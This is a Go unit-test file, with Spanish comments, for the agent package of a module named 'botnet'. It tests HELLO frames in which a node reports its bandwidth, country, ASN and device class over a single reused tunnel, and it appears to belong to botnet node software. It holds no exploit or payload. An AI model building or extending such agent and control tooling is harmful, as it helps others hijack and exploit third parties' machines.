package agent

import (
	"bytes"
	"net"
	"testing"

	"github.com/botnet/botnet/pkg/proto"
)

type fakeCaps struct {
	bw    uint16
	iso2  string
	asn   uint32
	class uint8
}

func (f fakeCaps) BWMbps() uint16     { return f.bw }
func (f fakeCaps) ISO2() string       { return f.iso2 }
func (f fakeCaps) ASN() uint32        { return f.asn }
func (f fakeCaps) DeviceClass() uint8 { return f.class }

func TestBuildHelloCaps(t *testing.T) {
	got := BuildHelloCaps(fakeCaps{bw: 45, iso2: "ES", asn: 3320, class: 'B'})
	want := proto.HelloCaps{BWMbps: 45, ISO2: "ES", ASN: 3320, DeviceClass: 'B'}
	if got != want {
		t.Fatalf("caps: got %+v want %+v", got, want)
	}
	// iso2 invalido se degrada a vacio, el resto se publica igual.
	bad := BuildHelloCaps(fakeCaps{bw: 10, iso2: "ESPA", class: 'C'})
	if bad.ISO2 != "" || bad.BWMbps != 10 {
		t.Fatalf("iso2 degradado: %+v", bad)
	}
}

func TestHelloFrameRoundTrip(t *testing.T) {
	var id [16]byte
	for i := range id {
		id[i] = byte(i)
	}
	caps := proto.HelloCaps{BWMbps: 12, ISO2: "PT", ASN: 12345, DeviceClass: 'A'}
	wire, err := HelloFrame(caps, id, 3)
	if err != nil {
		t.Fatalf("HelloFrame: %v", err)
	}
	f, err := proto.DecodeFrame(wire)
	if err != nil {
		t.Fatalf("DecodeFrame: %v", err)
	}
	if f.Type != proto.FrameHello || f.Seq != 3 || f.NodeID != id {
		t.Fatalf("frame: %+v", f)
	}
	var back proto.HelloCaps
	if err := back.Unmarshal(f.Payload); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}
	if back != caps {
		t.Fatalf("caps round trip: got %+v want %+v", back, caps)
	}
}

// memConn es el tunel de doble: cuenta escrituras sin sockets reales.
type memConn struct {
	buf bytes.Buffer
}

func (m *memConn) Write(p []byte) (int, error) { return m.buf.Write(p) }

// TestHelloSenderRidesExistingTunnel: el tunel del tramo se establece
// una sola vez y cada HELLO escribe en la conexion viva — 0 conexiones
// TCP nuevas para las capacidades (AC2).
func TestHelloSenderRidesExistingTunnel(t *testing.T) {
	c, s := net.Pipe()
	defer c.Close()
	defer s.Close()
	d := &CountingDialer{Conn: c}
	tun, terr := d.Dial() // unico tramo TCP: el tunel preexistente
	if terr != nil || tun == nil {
		t.Fatalf("tunel preexistente: %v", terr)
	}
	var mc memConn
	snd := &HelloSender{Conn: &mc, NodeID: [16]byte{1, 2, 3}}
	seq, err := snd.Send(proto.HelloCaps{BWMbps: 5, ISO2: "ES", ASN: 1, DeviceClass: 'A'})
	if err != nil {
		t.Fatalf("Send: %v", err)
	}
	if seq != 1 {
		t.Fatalf("seq: %d", seq)
	}
	if mc.buf.Len() == 0 {
		t.Fatal("HELLO no escribio en el tunel")
	}
	before := mc.buf.Len()
	if _, err := snd.Send(proto.HelloCaps{BWMbps: 6, ISO2: "ES", ASN: 1, DeviceClass: 'A'}); err != nil {
		t.Fatalf("re-HELLO: %v", err)
	}
	if mc.buf.Len() <= before {
		t.Fatal("re-HELLO no escribio")
	}
	if d.Dials != 1 {
		t.Fatalf("el HELLO abrio conexiones nuevas: Dials=%d (queremos 1 = el tunel)", d.Dials)
	}
}
